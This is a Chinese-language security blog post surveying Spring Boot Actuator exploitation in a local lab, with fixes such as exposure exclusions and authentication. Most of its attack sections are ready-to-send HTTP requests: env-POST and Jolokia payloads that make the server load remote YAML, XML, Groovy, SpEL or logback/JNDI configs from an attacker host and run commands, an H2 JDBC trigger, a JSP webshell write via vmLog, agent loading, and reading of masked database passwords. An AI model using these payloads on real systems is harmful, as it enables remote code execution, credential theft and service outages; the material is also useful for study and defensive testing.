#  springboot actuator漏洞总结   
原创 珂字辈  珂技知识分享   2025-02-20 10:00  
  
**一、	环境搭建**  
  
https://github.com/LandGrey/SpringBootVulExploit  
  
https://github.com/threedr3am/learnjavabug/tree/master/spring/spring-boot-actuator-bug  
  
其中spring 1.x和spring 2.x的actuator最大区别就是/env和/actuator/env。  
  
来看pom，显然漏洞组件一目了然。  
```
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-actuator</artifactId>
		</dependency>
```  
  
  
那么在我常用的一个自己搭建的springboot2.6.1漏洞环境中，仅添加这个组件，也不对application.yml做任何修改，会怎么样呢？可以看到默认只有/actuator/health，非常安全。  
  
/actuator  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU75TZVIyYZOsxAgqMzqkicUD7nL4NctibBEIibtJnJtDXyU7GUGW26Nxo30L5TmNeL5MSfvGlNIuJ8Og/640?wx_fmt=png&from=appmsg "")  
  
再看看漏洞环境的配置文件，其中比较重要的是。  
```
management.endpoints.web.exposure.include=*
```  
  
  
或者  
```
management.endpoints.web.exposure.include=env,heapdump
```  
  
  
这显然是actuator其他接口的白名单开关，开启之后就可以访问env，heapdump这些有威胁的actuator接口了。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU75TZVIyYZOsxAgqMzqkicUDU0PHcQZdkx6kzqjI78aVPfoTcKI3mR1wGRBVCBlSde4uRRCvkjORxQ/640?wx_fmt=png&from=appmsg "")  
  
存在相反的黑名单，可以用来禁用env。  
```
management.endpoints.web.exposure.exclude=env
```  
  
  
以及关闭所有actuator接口  
```
management.endpoints.enabled-by-default=false
```  
  
  
常用来作为修复方案。  
  
  
但是即使include=*，还是不能完成env的RCE利用，首先refresh，restart这两个用于重载的接口并没有，其次env也无法POST修改配置属性。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU75TZVIyYZOsxAgqMzqkicUDt5ZFkT5Ur6cibMPZcXaibGOxJVZy19UdDEeQrOMsgr2Dicu2wOXX4yAvw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU75TZVIyYZOsxAgqMzqkicUD8c0N91Gicoc88bORbNicqTfrJuibPPIibPVWENTbC6OF6h3Yr5xOhpkkxw/640?wx_fmt=png&from=appmsg "")  
  
这也是实战中为什么碰到env无法POST的原因，就是因为目标仅仅只有actuator组件和include=*。这种情况下只能利用heapdump找数据库密码/shirokey/session。  
  
除此之外，还有一些既需要include=*，又需要单独开关的接口，比如shutdown。它会真的停止服务，实战中别用。  
```
management.endpoint.shutdown.enabled=true
```  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU75TZVIyYZOsxAgqMzqkicUDpzCF019jVDRYJUqNK3W20RWqiayba7NMVSmW5R4u0pczR97WvY9hVHg/640?wx_fmt=png&from=appmsg "")  
  
那么如何搭建一个实战中可以RCE的环境呢，需要springcloud  
```
	<dependency>
		<groupId>org.springframework.cloud</groupId>
		<artifactId>spring-cloud-starter-bootstrap</artifactId>
	</dependency>
	......
	<dependencyManagement>
    <dependencies>
      <dependency>
        <groupId>org.springframework.cloud</groupId>
        <artifactId>spring-cloud-dependencies</artifactId>
        <version>2021.0.1</version>
        <type>pom</type>
        <scope>import</scope>
      </dependency>
    </dependencies>
  </dependencyManagement>
```  
  
  
注意springboot和springcloud的版本需要一一对应。  
  
此时就会多出一些actuator端点出来，比如refresh，而restart和shutdown一样需要单独开关。management.endpoint下面也会多出一些配置，其中包括了最关键的env POST。  
```
management.endpoint.restart.enabled=true
management.endpoint.env.post.enabled=true
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU75TZVIyYZOsxAgqMzqkicUDYqSHibKXkFZqzk97UwzEibQTVLjtxPw74vnquwZ7iaN9B4gq0vicnUzGibg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU75TZVIyYZOsxAgqMzqkicUD80w0Ep1zTjmJcQgGFGjdpbhUHGGdibsdVSUWbBU909PeymopjrbxgeQ/640?wx_fmt=png&from=appmsg "")  
  
还有一个已经废弃的配置，它在springboot 1.5.x差不多相当于前面这些开关的一键集成，有了它就可以直接env POST。  
```
management.security.enabled=false
```  
  
而更进一步在1.4.x或者更早的版本，默认情况下无需配置即可访问env并POST修改配置。  
  
  
此外还有spring-boot-starter-security可以跟actuator加认证。  
```
security.user.name=admin
security.user.password=123456
management.security.enabled=true
management.security.role=ADMIN
```  
  
或者给actuator改个目录  
```
management.endpoints.web.base-path=/monitor
```  
  
来作为防御措施。  
  
  
  
二、	env RCE  
  
  
1，SnakeYaml反序列化(refresh)  
  
env最基础的RCE方式有两个，一个是远程加载yml文件，然后refresh触发SnakeYaml反序列化。  
```
POST /actuator/env HTTP/1.1
Host: 127.0.0.1:9999
Content-Type: application/json
Content-Length: 28

{"name":"spring.cloud.bootstrap.location","value":"http://127.0.0.1:81/example.yml"}
```  
  
```
POST /actuator/refresh HTTP/1.1
Host: 127.0.0.1:9999
Content-Type: application/json
Content-Length: 2

{}
```  
  
  
yml文件写法如下(可更换成其他SnakeYaml反序列化)  
  
https://github.com/artsploit/yaml-payload  
  
但是这个payload是将springboot 1.x env SnakeYaml RCE转化成2.x，实际上在2.x上是没法用的，refresh并不会远程加载yml，具体分析如下。  
  
https://b1ngz.github.io/exploit-spring-boot-actuator-spring-cloud-env-note/  
  
比refresh更进一步的restart可以触发远程加载yml。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU75TZVIyYZOsxAgqMzqkicUDovib177eNeyK8YHVfLpCOMnnDbmBhfQb3ulLAVSjRd9UevucljeKtJg/640?wx_fmt=png&from=appmsg "")  
  
但这个动作非常危险，因为它虽然能触发远程加载yml，但无法完成反序列化，并且还会因此抛错并退出springboot进程。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU75TZVIyYZOsxAgqMzqkicUDptSK6KqCg6yz0Q0AJEqice482U63zgucicRA8TCgp0UwVzn3RcL3f1CA/640?wx_fmt=png&from=appmsg "")  
  
通过断点Yaml的创建过程可知，高版本springboot使用了安全构造器，因此无法反序列化(后记：还有别的原因，请看上面的文章)。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU75TZVIyYZOsxAgqMzqkicUD2MhB1K87Nxa8zNXglfRDWvhydJV6N22LcibTwXr7kCv4bMqLyibOCMQw/640?wx_fmt=png&from=appmsg "")  
  
  
2，Xstream反序列化(refresh)  
  
另外一种RCE是eureka xstream deserialization RCE，需要依赖。  
```
<dependency>
    <groupId>org.springframework.cloud</groupId>
    <artifactId>spring-cloud-starter-netflix-eureka-client</artifactId>
</dependency>
```  
  
然后  
```
POST /actuator/env HTTP/1.1
Host: 127.0.0.1:9999
Content-Type: application/json
Content-Length: 81

{"name":"eureka.client.serviceUrl.defaultZone","value":"http://127.0.0.1:8088/"}
```  
  
```
POST /actuator/refresh HTTP/1.1
Host: 127.0.0.1:9999
Content-Type: application/json
Content-Length: 2

{}
```  
  
恶意服务端  
  
https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-xstream-rce.py  
  
其原理是远程加载xml造成Xstream反序列化，因此必须xstream<=1.4.17，springboot2.x版本过高xstream版本将不满足利用条件。  
  
除此之外，eureka-client自己实现了XmlXStream，在1.8.7版本添加了白名单类。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU75TZVIyYZOsxAgqMzqkicUDXQWGD1VpNCEz0EFibwWvX4r5ZfvYcLbQZOcO2ZFZsCZmgiaGM3kCGYvQ/640?wx_fmt=png&from=appmsg "")  
  
所以这个RCE办法基本也只限于spingboot1.x版本，spingboot2.x版本必须手动降级两个组件才能触发此漏洞。  
```
<dependency>
    <groupId>com.thoughtworks.xstream</groupId>
    <artifactId>xstream</artifactId>
    <version>1.4.10</version>
</dependency>
<dependency>
    <groupId>com.netflix.eureka</groupId>
    <artifactId>eureka-client</artifactId>
    <version>1.8.6</version>
</dependency>
```  
  
  
基本原理如下，断点ClientResponse.getEntity(Class<T>, Type) line: 634	。  
  
refresh之后触发eureka-client去访问我们伪造的服务端。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU75TZVIyYZOsxAgqMzqkicUDiccM6Bol62D61FRHLiaBIgKa6YbU85HhDjZicGrnRCKStcGK5hJMp0gBQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU75TZVIyYZOsxAgqMzqkicUDd3aSKjOIMVzmxacMSK26pVIeqvyOScZIufQzyBd0v94KjmZP20Nshg/640?wx_fmt=png&from=appmsg "")  
  
其中getApplications这一步会触发漏洞。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU75TZVIyYZOsxAgqMzqkicUDOkzibyjDefcUQs1XcJ9KEHibVQiaBHqC24ME9EJIEOZ6qCvT6dqNSTx3w/640?wx_fmt=png&from=appmsg "")  
  
获取xml请求后触发Xstream反序列化。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU75TZVIyYZOsxAgqMzqkicUDdqGYibD6Iic41W5mLiaEhGu5HlAt6TW9qkLtqIahFH1k016ll9wRFOVgQ/640?wx_fmt=png&from=appmsg "")  
  
经典的fromXML  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU75TZVIyYZOsxAgqMzqkicUDcL4OBuZYULts0vTE9HTfmkSyE5571vEmkVAdiccFW50BD2w1wvz78AA/640?wx_fmt=png&from=appmsg "")  
  
  
3，执行任意SQL(restart)  
  
数据库相关配置中，一般存在一个连接数据库的测试语句配置，或者一个执行查询时的测试语句配置。springboot中默认使用HikariCP作为链接池，因此可以修改这个属性来达到执行任意SQL的目的。  
```
POST /actuator/env HTTP/1.1
Host: 127.0.0.1:9999
Content-Type: application/json
Content-Length: 84

{"name":"spring.datasource.hikari.connection-test-query","value":"select sleep(2);"}
```  
```
POST /actuator/restart HTTP/1.1
Host: 127.0.0.1:9999
Content-Type: application/json
Content-Length: 2

{}
```  
  
随后访问一些跟数据库交互的接口，可以发现sleep(2)被执行了。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU75TZVIyYZOsxAgqMzqkicUDFuzicIaibfvqWLuJRYia3CpJII1b1pibauYDno9nY21ea83OQ8POIbRkmQ/640?wx_fmt=png&from=appmsg "")  
  
其他跟sql执行相关的属性。  
```
spring.datasource.hikari.connection-init-sql
spring.datasource.tomcat.validationQuery
spring.datasource.dbcp2.validation-query
spring.datasource.dbcp2.connection-init-sqls
spring.datasource.druid.validation-query
spring.datasource.data
spring.sql.init.data-locations
```  
  
  
4，jdbc(restart)  
  
既然都修改数据库配置了，那么一步到位，直接改jdbc。  
  
PS：实战中别用。  
```
POST /actuator/env HTTP/1.1
Host: 127.0.0.1:9999
Content-Type: application/json
Content-Length: 70

{"name":"spring.datasource.driver-class-name","value":"org.h2.Driver"}
```  
```
POST /actuator/env HTTP/1.1
Host: 127.0.0.1:9999
Content-Type: application/json
Content-Length: 219

{"name":"spring.datasource.url","value":"jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\nINFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('calc')\\;\n$$\n"}
```  
```
POST /actuator/restart HTTP/1.1
Host: 127.0.0.1:9999
Content-Type: application/json
Content-Length: 2

{}
```  
  
重启后访问任意数据库交互接口。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU75TZVIyYZOsxAgqMzqkicUDJ6yLBLLd3lILv39v648uhnMorcUV6icQIFAKYpO7o6VPHP4eECbqRmQ/640?wx_fmt=png&from=appmsg "")  
  
  
5，logback jndi/groovy(restart)  
  
远程加载logback配置文件，进行jndi或者groovy语句执行。同样导致服务停止，实战别用。  
```
POST /actuator/env HTTP/1.1
Host: 127.0.0.1:9999
Content-Type: application/json
Content-Length: 69

{"name":"logging.config","value":"http://127.0.0.1:8088/example.xml"}
```  
  
example.xml  
```
<configuration>
  <insertFromJNDI env-entry-name="ldap://127.0.0.1:1389/BeanFactory:groovyclassloaderbypass:Y2FsYw==" as="appName" />
</configuration>
```  
  
restart触发  
```
POST /actuator/restart HTTP/1.1
Host: 127.0.0.1:9999
Content-Type: application/json
Content-Length: 2

{}
```  
  
groovy依赖  
```
<dependency>
	<groupId>org.codehaus.groovy</groupId>
	<artifactId>groovy</artifactId>
	<version>2.5.8</version>
</dependency>
```  
  
```
POST /actuator/env HTTP/1.1
Host: 127.0.0.1:9999
Content-Type: application/json
Content-Length: 72

{"name":"logging.config","value":"http://127.0.0.1:8088/example.groovy"}
```  
  
example.groovy  
```
Runtime.getRuntime().exec("calc")
```  
  
restart触发  
```
POST /actuator/restart HTTP/1.1
Host: 127.0.0.1:9999
Content-Type: application/json
Content-Length: 2

{}
```  
  
核心加载方法位于ContextInitializer.configureByResource(URL) line: 67	  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU75TZVIyYZOsxAgqMzqkicUDSvZTs2NcuajAtoiaLSkSt7x8cnWYpPsib5SeIzicMCoxz7tHFb3IdUZ1A/640?wx_fmt=png&from=appmsg "")  
  
注意，springboot默认使用logback，但如果你设置了spring-boot-starter-logging，则会使用log4j，无法复现此漏洞。  
```
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter</artifactId>
    <exclusions>
        <exclusion> 
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-logging</artifactId>
        </exclusion>
    </exclusions>
</dependency>
```  
  
  
6，spring.main.sources groovy/spel(restart)  
  
跟logback差不多的原理。  
```
POST /actuator/env HTTP/1.1
Host: 127.0.0.1:9999
Content-Type: application/json
Content-Length: 77

{"name":"spring.main.sources","value":"http://127.0.0.1:8088/example.groovy"}
```  
  
example.groovy  
```
Runtime.getRuntime().exec("calc")
```  
  
```
POST /actuator/restart HTTP/1.1
Host: 127.0.0.1:9999
Content-Type: application/json
Content-Length: 2

{}
```  
  
还有LandGrey没提到的spel RCE。  
```
POST /actuator/env HTTP/1.1
Host: 127.0.0.1:9999
Content-Type: application/json
Content-Length: 71

{"name":"spring.main.sources","value":"http://127.0.0.1:8088/spel.xml"}
```  
  
  
spel.xml  
```
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://www.springframework.org/schema/beans
    http://www.springframework.org/schema/beans/spring-beans.xsd">
<bean id="world" class="java.lang.String">
<constructor-arg value="#{T (java.lang.Runtime).getRuntime().exec('calc')}"/>
</bean>
</beans>
```  
```
POST /actuator/restart HTTP/1.1
Host: 127.0.0.1:9999
Content-Type: application/json
Content-Length: 2

{}
```  
  
核心加载方法位于BeanDefinitionLoader.load(Resource) line: 180	  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU75TZVIyYZOsxAgqMzqkicUDBiaia5Lic3ZJibKAL81v2JLnstU5b2NwvXicdNES4ShTef9YRL4OLz7AiaOA/640?wx_fmt=png&from=appmsg "")  
  
  
  
三、	jolokia RCE  
  
  
1，jolokia用法  
  
jolokia同样并非actuator默认组件，需要如下依赖  
```
    <dependency>
      <groupId>org.jolokia</groupId>
      <artifactId>jolokia-core</artifactId>
    </dependency>
```  
  
其核心功能就是调用mbean，具体有哪些mbean访问/actuator/jolokia/list可以查看。  
  
比如常用的getProperty，可以拿来查看env那些被星号掩码的密码相关属性。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU75TZVIyYZOsxAgqMzqkicUDlwosVNCgbMUmk5aLSJgu0ud5y3BbfYNY08W2Kh16B8vl1sibaic8fD7Q/640?wx_fmt=png&from=appmsg "")  
  
具体代码位于org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar$SpringApplicationAdmin  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU75TZVIyYZOsxAgqMzqkicUDFJo3NKwFtJU8vsyliaYBmoW2Ley10N4J0wib8emtmxIEh5YDfZxl5nBQ/640?wx_fmt=png&from=appmsg "")  
  
存在两种调用格式，后者由于是纯GET请求，所以实战中可以跟SSRF配合。且GET这种由于使用【/】分割，传参时需要用【/】时可以替换成【!/】  
```
POST /actuator/jolokia HTTP/1.1
Host: 127.0.0.1:9999
Content-Type: application/json
Content-Length: 159

{"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "getProperty", "type": "EXEC", "arguments": ["spring.datasource.password"]}
```  
```
GET /actuator/jolokia/exec/org.springframework.boot:name=SpringApplication,type=Admin/getProperty/spring.datasource.password HTTP/1.1
Host: 127.0.0.1:9999


```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU75TZVIyYZOsxAgqMzqkicUD44CAgZqv2iaO54ljPcJxoYKMK6oeTGia3zMfcJCxjPMpQSxicCw3ZiaSBA/640?wx_fmt=png&from=appmsg "")  
  
  
那么shutdown也很容易做到了。  
  
PS：用jolokia进行shutdown/restart依旧受到management.endpoint配置影响。  
```
POST /actuator/jolokia HTTP/1.1
Host: 127.0.0.1:9999
Content-Type: application/json
Content-Length: 112

{"mbean": "org.springframework.boot:name=SpringApplication,type=Admin","operation": "shutdown", "type": "EXEC",}
```  
  
除了exec执行方法之外，还有read/write等功能，比如获取Druid版本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU75TZVIyYZOsxAgqMzqkicUDwtPQex3zvxnY5KIVj3Ephha34ibNvdHtZyNatCU4KUOg6AHcg7kw1pg/640?wx_fmt=png&from=appmsg "")  
  
  
  
2，env POST  
  
了解了jolokia基础用法，很容易在mbean中找到一个真正有威胁的方法。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU75TZVIyYZOsxAgqMzqkicUDwO5KWN3J3lQ7EkSeXwzu22KslMiazTEL6JfnRWedia61LrcsDCNfmkkA/640?wx_fmt=png&from=appmsg "")  
  
它可以设置任意属性，和env POST效果一模一样，在不开启env.post.enabled=true的情况下可以代替env POST。  
```
POST /actuator/jolokia HTTP/1.1
Host: 127.0.0.1:9999
Content-Type: application/json
Content-Length: 179

{"mbean": "org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager","operation": "setProperty", "type": "EXEC", "arguments": ["spring.main.sources","http://127.0.0.1:8088/example.groovy"]}
```  
```
POST /actuator/jolokia HTTP/1.1
Host: 127.0.0.1:9999
Content-Type: application/json
Content-Length: 106

{"mbean": "org.springframework.boot:name=Restart,type=Endpoint","operation": "restart", "type": "EXEC",}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU75TZVIyYZOsxAgqMzqkicUDJDSia3iaqsZy7KLwvzYWELGYGQ6C3ALNBib7e1Cq6D6RqmpvMu4DLvJ1A/640?wx_fmt=png&from=appmsg "")  
  
  
3，logback JNDI  
  
需要使用logback且有一个合法的logback.xml文件  
```
<configuration>
    <appender name="STDOUT" class="ch.qos.logback.core.ConsoleAppender">
        <withJansi>true</withJansi>
        <encoder>
            <pattern>[%thread] %highlight(%-5level) %cyan(%logger{15}) - %msg %n</pattern>
        </encoder>
    </appender>
    <root level="info">
        <appender-ref ref="STDOUT" />
    </root>
    <jmxConfigurator/>
</configuration>
```  
  
logback中存在一个可利用的Mbean  
  
ch.qos.logback.classic.jmx.JMXConfigurator  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU75TZVIyYZOsxAgqMzqkicUD3WVkZ2chrE0SswwqJT42f2TAPY2ibcc1wcicFC5n5kLm7ia5E0mnqrEicg/640?wx_fmt=png&from=appmsg "")  
  
它会远程加载配置并重载，原理跟env RCE的logback jndi一样。  
```
POST /jolokia HTTP/1.1
Host: 127.0.0.1:9999
Content-Type: application/json
Content-Length: 193
{"mbean": "ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator","operation": "reloadByURL", "type": "EXEC", "arguments": ["http://127.0.0.1:8088/example.xml"]}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/fUHjCzeNkU75TZVIyYZOsxAgqMzqkicUDswZ9Rg085mb6LQupibbiaNBURO9Jxnjxzgzfh9p9nRj7iby4ic7sM35cPw/640?wx_fmt=png&from=appmsg "")  
  
同理，此方法的上面还有个reloadByFileName，但只能加载本地文件。  
  
  
4，DiagnosticCommand  
  
https://thinkloveshare.com/hacking/ssrf_to_rce_with_jolokia_and_mbeans/  
  
在>=jdk9中，会多一些JVM操作的Mbean。  
  
获取环境变量  
```
POST /actuator/jolokia HTTP/1.1
Host: 127.0.0.1:9999
Content-Type: application/json
Content-Length: 105

{"mbean": "com.sun.management:type=DiagnosticCommand","operation": "vmSystemProperties", "type": "EXEC",}
```  
  
读取文件信息  
```
POST /actuator/jolokia HTTP/1.1
Host: 127.0.0.1:9999
Content-Type: application/json
Content-Length: 144

{"mbean": "com.sun.management:type=DiagnosticCommand","operation": "compilerDirectivesAdd", "type": "EXEC", "arguments": ["C:\Windows\win.ini"]}
```  
  
利用vmlog写文件(会携带大量脏数据，基本只能webshell)  
```
POST /actuator/jolokia HTTP/1.1
Host: 127.0.0.1:9999
Content-Type: application/json
Content-Length: 137

{"mbean": "com.sun.management:type=DiagnosticCommand","operation": "vmLog", "type": "EXEC", "arguments": ["output=D:\\Downloads\\1.jsp"]}
```  
```
POST /actuator/jolokia HTTP/1.1
Host: 127.0.0.1:9999
Content-Type: application/json
Content-Length: 56

{ "type": "<% Runtime.getRuntime().exec(\"calc\"); %>",}
```  
```
POST /actuator/jolokia HTTP/1.1
Host: 127.0.0.1:9999
Content-Type: application/json
Content-Length: 117

{"mbean": "com.sun.management:type=DiagnosticCommand","operation": "vmLog", "type": "EXEC", "arguments": ["disable"]}
```  
  
加载agent  
```
POST /actuator/jolokia HTTP/1.1
Host: 127.0.0.1:9999
Content-Type: application/json
Content-Length: 149

{"mbean": "com.sun.management:type=DiagnosticCommand","operation": "jvmtiAgentLoad", "type": "EXEC", "arguments": ["D:\\Downloads\\springagent.jar"]}
```  
  
这部分代码不在.java源码中，似乎在so/dll中。  
  
https://github.com/AdoptOpenJDK/openjdk-jdk/blob/9d8ad2ed62325bd8d813974d5aa1e031ed8bf8da/src/hotspot/share/services/diagnosticCommand.cpp#L886  
  
  
5，tomcat  
  
尽管jolokia一般在springboot中使用，但在实战中也碰到过原生tomcat用的，此时可能存在更多的Mbean，同时也支持jsp的webshell，利用起来更加容易。  
  
比如类似CVE-2022-22965的改tomcat日志写webshell的手法。  
  
https://github.com/laluka/jolokia-exploitation-toolkit/blob/main/exploits/file-write-to-rce-valve.md  
  
  
四、	其他常用端点  
  
  
/actuator/heapdump  
  
最常用的端点，直接dump出整个jvm内存，里面可能包含数据库账户密码/shirokey/acesskey/session等等敏感的东西。  
  
https://github.com/whwlsfb/JDumpSpider  
  
/actuator/httptrace  
  
/actuator/trace  
  
展示最近的http请求信息，很容易泄露session，危害较高  
  
/actuator/configprops  
  
和env类似，展示properties，危害中等  
  
/actuator/mappings  
  
展示请求映射信息，会泄露API，危害中等  
  
/actuator/metrics  
  
应用程序健康状况相关key，/actuator/metrics/jvm.memory.max这样可以访问对应的value，危害较低  
  
/actuator/beans  
  
所有bean类，危害较低  
  
/actuator/conditions  
  
所有condition类，危害较低  
  
/actuator/threaddump  
  
展现线程情况，危害较低  
  
/actuator/health  
  
获取应用程序的健康状态信息，无危害  
  
/actuator/info  
  
获取应用程序的自定义信息，无危害  
  
/actuator/loggers  
  
展示日志等级，无危害  
  
/actuator/scheduledtasks  
  
定时任务，基本无危害  
  
  
更多参考  
  
https://docs.spring.io/spring-boot/docs/2.6.1/actuator-api/htmlsingle/  
  
  
